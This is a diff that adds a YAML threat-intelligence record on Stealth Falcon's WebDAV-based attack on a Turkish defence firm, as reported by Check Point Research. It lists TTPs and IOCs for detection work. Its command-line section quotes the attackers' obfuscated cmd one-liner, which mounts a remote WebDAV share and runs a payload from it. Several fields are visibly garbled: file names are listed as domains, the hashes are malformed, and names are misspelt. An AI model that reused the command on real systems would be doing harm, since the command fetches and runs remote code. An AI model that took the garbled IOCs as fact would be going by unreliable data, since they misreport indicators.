@@ -1,0 +1,121 @@
+description: In March 2025, Check Point Research identified an attempted cyberattack
+  against a defense company in Turkey. The threat actors used a previously undisclosed
+  technique to execute files hosted on a WebDAV server they controlled, by manipulating
+  the working directory of a legitimate built-in Windows tool.
+attribution: Stealth Falcon (also known as FruityArmor)
+malware_families:
+- Horus Agent
+- Apollo
+- StatusReport.dll (Loader)
+- Keylogger DLL
+- Mythic C2 Server
+authors:
+- Check Point Research
+TTPs:
+  processes:
+  - iediagcmd.exe
+  - route.exe
+  - CustomShellHost.exe
+  - explorer.exe
+  - taskkill.exe
+  - cmd.exe
+  - WWAHost.exe
+  - UserAccessBroker.exe
+  - usrprofscc.exe
+  - ipconfig.exe
+  - dxdiag.exe
+  - FXSCOVER.exe
+  - WFS.exe
+  - CustonshellHost.exe
+  - write.exe
+  - UsTOInstaller.exe
+  - avp.exe
+  - avpsus.exe
+  - avpui.exe
+  - bccavsvc.exe
+  - aswidsagent.exe
+  - AVGSvc.exe
+  - avgToolsSve.exe
+  - wsc_proxy.exe
+  commandline:
+  - iediagcmd.exe /showconfig
+  - route.exe
+  - C:\\Program Files\\Internet Explorer\\iediagcmd.exe
+  - \\\\summerartcamp[.]net@ssl@443/DavWWWRoot\\OSYxaOjr
+  - C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe
+  - taskkill.exe /IM i /F
+  - taskkill.exe /IM e /F
+  - cmd.exe /c DeviceCredentialDep^loyment & cmd /V:ON /C "set EDITOR=chttpim& pushd
+    \\\\mystartupblog.com@ssl@443\\eQwcvcZIy&start /B https://mystartupblog.com/ePkNWY/deUsplnb.pdf&timeout
+    8&@for^files /p c:\\windows /m notepad.exe /c \\\\mystartupblog.com@ssl@443\\eQwcvcZIy\\Supplier0.8bps&popd"
+  - DeviceCredentialDep^loyment
+  - set EDITOR=chttpim
+  - pushd \\\\mystartupblog.com@ssl@443\\eQwcvcZIy
+  - start /B https://mystartupblog.com/ePkNWY/deUsplnb.pdf
+  - timeout 8
+  - '@for^files /p c:\\windows /m notepad.exe /c \\\\mystartupblog.com@ssl@443\\eQwcvcZIy\\Supplier0.8bps'
+  - popd
+  - ipconfig /all
+  - route print
+  - taskkill /IM iediagcnd.exe /i
+  - taskkill /IM dxdiag.exe /F
+  - taskkill /IM FXSCOVER.exe /F
+  - taskkill /IM WFS.exe /F
+  - taskkill /IM CustonshellHost.exe /F
+  - taskkill /IM write.exe /F
+  - taskkill /IM UsTOInstaller.exe /F
+  powershell: []
+  scripting_engine: []
+  registry_keys:
+  - SYSTEM\Controlset@o1\Services\Tcpip\Paraneters
+  - W_Dona
+  image_load:
+  - ExpandEnvironmentStringsA
+  - WriteProcessMemory
+  - GetThreadContext
+  - SetThreadContext
+  - ResumeThread
+  network_connections:
+  - executable: iediagcmd.exe
+    destination: summerartcamp[.]net@ssl@443
+    port: 443
+  - executable: route.exe
+    destination: summerartcamp[.]net@ssl@443
+    port: 443
+  file_activity:
+  - C:\\Program Files\\Internet Explorer\\iediagcmd.exe
+  - \\\\summerartcamp[.]net@ssl@443/DavWWWRoot\\OSYxaOjr\\route.exe
+  - '%temp%\\TLM.005_TELESKOPIK_MAST_HASAR_BILDIRIM_RAPORU.pdf'
+  - C:\\ProgramData\\ds_notifier_0.vhdx
+  - C:\\ProgramData\\ds_notifier_2.vif
+  - '%temp%\\logfile.log'
+  - C:\Windows\Temp\~TN%LogName%.tmp
+  persistence:
+  - Creating a Windows service (UsrProfSCCUser Profile Service Check)
+  - Service creation with parameters
+  pipes: []
+  process_relations:
+  - iediagcmd.exe -> route.exe
+  - CustomShellHost.exe -> explorer.exe
+  - StatusReport.dll (Loader) -> dxdiag.exe
+  - dxdiag.exe -> Shellcode
+  - Shellcode -> Keylogger DLL
+IOCs:
+- summerartcamp[.]net@ssl@443
+- CVE-2025-33053
+- bd10efec-3067-3329-620b-600d158dc62e
+- 5D EC B6 42 02 98 AF F8 4A E6 A9 EF 57 1B 41 29 14 8D 09 BB 99 DD 08 D8 57 A7 2D
+  3F 6E D1 DA FA
+- E6 A6 D2 5A 3F B5 57 43 F2 26 B5 B4 B4 DC A8 56
+- Domains:
+  - lediagcmd.exe
+  - netsummerartcampl[.]net
+  - route.exe
+- URLs:
+  - TLM.OO5_TELESKOPIK_MAST_HASAR_BILDIRIM_RAPORU.pdf.url
+- Hashes:
+  - '6x1768666F RID: 111'
+  - '6xB6686268 RID: 616'
+reference: https://research.checkpoint.com/2025/stealth-falcon-zero-day/
+date_of_publication: June 10, 2025
+file_creation_date: June 11, 2025
